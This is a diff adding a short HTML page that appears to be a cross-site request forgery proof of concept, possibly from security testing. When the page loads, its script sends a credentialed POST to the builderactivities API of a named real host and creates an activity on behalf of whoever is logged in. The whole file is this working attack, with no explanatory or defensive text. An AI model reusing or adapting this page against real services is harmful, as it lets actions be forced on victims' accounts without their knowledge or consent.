@@ -1,0 +1,21 @@
+<html>
+<body>
+<script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https:\/\/sttr-builder-acc.apps.geodan.nl\/api\/builderactivities?destination=DSO", true);
+        xhr.setRequestHeader("accept-language", "en-US,en;q=0.9");
+        xhr.setRequestHeader("accept", "application\/json, text\/plain, *\/*");
+        xhr.setRequestHeader("content-type", "application\/json");
+        xhr.withCredentials = true;
+        var body = "{\"dsoActivityId\":\"\",\"isInEditBy\":\"\",\"isInEditById\":\"\",\"isShared\":false,\"name\":\"test\",\"urns\":[],\"destination\":\"DSO\"}";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+      submitRequest();
+    </script>
+</body>
+</html>
